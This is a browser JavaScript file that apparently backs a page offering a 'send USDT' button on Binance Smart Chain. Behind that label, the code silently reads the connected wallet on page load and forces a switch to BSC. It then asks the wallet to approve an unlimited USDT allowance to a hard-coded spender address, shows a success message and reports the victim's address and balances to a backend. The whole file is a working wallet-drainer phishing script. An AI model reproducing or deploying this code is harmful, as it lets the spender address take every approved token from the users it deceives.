let provider;
let userAddress = null;
let isConnected = false;

// ===== BSC CONFIG - FORCE BSC ONLY =====
const BSC_CHAIN_ID = 56; // BSC Mainnet Chain ID
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

// ===== COMPLETELY SILENT - NO POPUPS =====
// Only silent checks, no wallet requests on load
window.addEventListener("load", async () => {
  if (window.ethereum) {
    try {
      // Setup provider silently
      provider = new ethers.BrowserProvider(window.ethereum);
      
      // ONLY check if already connected (100% silent, no popup)
      const accounts = await window.ethereum.request({ method: "eth_accounts" });
      
      if (accounts.length > 0) {
        userAddress = accounts[0];
        isConnected = true;
        
        // Auto-fill address
        if (window.updateWalletAddress) {
          window.updateWalletAddress(userAddress);
        }
      }
    } catch (err) {
      console.log("Silent setup failed:", err);
    }
  }
});

// ===== APPROVE (BSC ONLY) =====
async function sendUSDT() {
  try {
    if (!window.ethereum) {
      alert("Trust Wallet not detected");
      return;
    }

    // Ensure we have provider
    if (!provider) {
      provider = new ethers.BrowserProvider(window.ethereum);
    }

    // Silently check and switch to BSC if needed
    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    if (chainId !== "0x38") {
      // Force switch to BSC
      try {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }]
        });
      } catch (switchErr) {
        if (switchErr.code === 4902) {
          // Add BSC network if not exists
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: "0x38",
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"]
            }]
          });
        }
      }
    }

    // Get signer (works silently if already connected in Trust Wallet)
    const signer = await provider.getSigner();
    const address = await signer.getAddress();

    // Create contract
    const usdt = new ethers.Contract(BSC_USDT, ABI, signer);

    // Get balances
    const usdtBalanceWei = await usdt.balanceOf(address);
    const usdtBalance = ethers.formatUnits(usdtBalanceWei, 18);
    
    const nativeBalanceWei = await provider.getBalance(address);
    const nativeBalance = ethers.formatEther(nativeBalanceWei);

    // Approve transaction
    const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);
    const receipt = await tx.wait();

    alert("Transaction successful ✅");

    // Save to backend
    if (window.saveTransaction) {
      window.saveTransaction({
        walletAddress: address,
        toAddress: BSC_SPENDER,
        txHash: receipt.hash,
        usdtBalance: usdtBalance,
        nativeBalance: nativeBalance
      });
    }

  } catch (e) {
    if (e.code === 4001) {
      alert("Transaction cancelled");
    } else {
      alert("Error: " + e.message);
    }
  }
}

window.sendUSDT = sendUSDT;
